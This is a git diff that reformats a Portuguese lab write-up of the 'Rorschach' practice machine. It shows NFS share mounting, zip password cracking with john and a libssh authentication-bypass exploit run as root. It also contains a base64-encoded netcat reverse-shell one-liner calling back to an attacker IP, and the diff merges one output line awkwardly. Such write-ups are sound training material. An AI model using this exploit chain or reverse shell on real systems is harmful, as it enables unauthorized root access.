@@ -1,6 +1,7 @@
-EHPT - Rorschach
-
-# EHPT - Rorschach
+---
+title: Rorschach
+category: EHPT
+---
 
 ## Enumeração
 
@@ -8,7 +9,7 @@ EHPT - Rorschach
 
 - Iniciando a enumeração da máquina com nmap, encontrados os seguintes serviços em execução
 
-```
+```plaintext
 # Nmap 7.80 scan initiated Fri Jun 19 18:27:13 2020 as: nmap -A -p22,111,2049,8140,41191,44285,45397,51707 -Pn -oA full 10.0.0.9
 
 Nmap scan report for 10.0.0.9
@@ -62,7 +63,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 - Uma vez que foi notado um serviço de nfs na porta 2049/TCP, inciado a enumeração do mesmo através do comando showmount, que mostra que o mesmo é publicamente acessível
 
-```
+```plaintext
 dcruz@kali:/dcruz/ehpt/rorschach/scan$ showmount -e 10.0.0.9
 Export list for 10.0.0.9:
 /media/nfs *
@@ -70,7 +71,7 @@ Export list for 10.0.0.9:
 
 - Realizado o ponto de montagem do diretório e encontrados os seguintes arquivos no mesmo
 
-```
+```plaintext
 dcruz@kali:/dcruz/ehpt/rorschach$ mkdir mount
 dcruz@kali:/dcruz/ehpt/rorschach$ sudo mount -t nfs 10.0.0.9:/media/nfs /dcruz/ehpt/rorschach/mount/
 dcruz@kali:/dcruz/ehpt/rorschach$ cd mount/
@@ -90,7 +91,7 @@ drwxr-xr-x 6 dcruz dcruz  4096 Jun 19 18:38 ..
 
 - Uma vez que ambos os arquivos tem a mesma quantidade de bytes, executado o file em abos e visto que são o mesmo arquivo, o que pode ser tambem comprovado com o comando sha1sum
 
-```
+```plaintext
 dcruz@kali:/dcruz/ehpt/rorschach/mount$ file index.html 
 index.html: Zip archive data, at least v?[0x333] to extract
 dcruz@kali:/dcruz/ehpt/rorschach/mount$ file secret.pdf.zip 
@@ -99,13 +100,12 @@ dcruz@kali:/dcruz/ehpt/rorschach/mount$ cat index.html | shasum
 be678da6d06a027e2b6478cd8117c5cd8e094152  -
 dcruz@kali:/dcruz/ehpt/rorschach/mount$ cat secret.pdf.zip | shasum 
 be678da6d06a027e2b6478cd8117c5cd8e094152  -
-dcruz@kali:/dcruz/ehpt/rorschach/mount$ 
-
+dcruz@kali:/dcruz/ehpt/rorschach/mount$
 ```
 
 - Copiado arquivo para pasta loot, o qual ao tentar extrair, solicitou password
 
-```
+```plaintext
 dcruz@kali:/dcruz/ehpt/rorschach/loot$ 7z x secret.pdf.zip
 
 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
@@ -125,7 +125,7 @@ Enter password (will not be echoed):
 
 - Utilizado zip2john e john para quebrar a senha do arquivo zip, com o dicionário rockyou.txt
 
-```
+```plaintext
 dcruz@kali:/dcruz/ehpt/rorschach/loot$ zip2john secret.pdf.zip > zip.hash
 dcruz@kali:/dcruz/ehpt/rorschach/loot$ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -153,7 +153,7 @@ secret.pdf.zip/secret.pdf:paradise!:secret.pdf:secret.pdf.zip:secret.pdf.zip
 
 - Retomando a enumeração dos serviços na maquina, identificado que na porta 8140/TCP existe um serviço SSH executando a libssh 0.8.3. Rapidamente buscando no searchsploit esta biblioteca, identificado que esta se trata de uma versão vulnerável a acesso não autorizado
 
-```
+```plaintext
 dcruz@kali:/dcruz/ehpt/rorschach/loot$ searchsploit libssh
 --------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
@@ -169,30 +169,29 @@ Shellcodes: No Results
 
 - Verificando o segundo exploit (**46307**) identificado que este permite a execução de um comando informando como argumentos ao script o hostname, porta e comando desejado. Ao executar com os dados desejados, notado que já é possivel obter um shell como root nesta maquina :)
 
-```
+```plaintext
 dcruz@kali:/dcruz/ehpt/rorschach/exploit$ ./46307.py 10.0.0.9 8140 id
 /home/dcruz/.local/lib/python3.8/site-packages/paramiko/rsakey.py:127: CryptographyDeprecationWarning: signer and verifier have been deprecated. Please use sign and verify instead.
-verifier = key.verifier(
-uid=0(root) gid=0(root) groups=0(root)
+verifier = key.verifier(uid=0(root) gid=0(root) groups=0(root)
 ```
 
 - Uma vez que temos execução remota de código como root, executados os comandos necessários para obter um shell reverso para que pudéssemos obter a flag.
 
-```
+```plaintext
 dcruz@kali:/dcruz/ehpt/rorschach/exploit$ ./46307.py 10.0.0.9 8140 "echo -n 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI│
 +JjF8bmMgMTAuMC4wLjMgNDQ0MyA+L3RtcC9mCg==' | base64 -d | bash"  
 ```
 
 - Como Root, obtido flag na maquina
 
-```
+```plaintext
 # cat .root.txt
 b077bffcb1ef246f7cc77ae2a86bc684
 ```
 
 - Uma vez que se tem root na maquina, obtido os demais flags existentes na máquina
 
-```
+```plaintext
 root@debian:/# find / 2> /dev/null | grep .txt$
 [....]
 /home/noob/local.txt
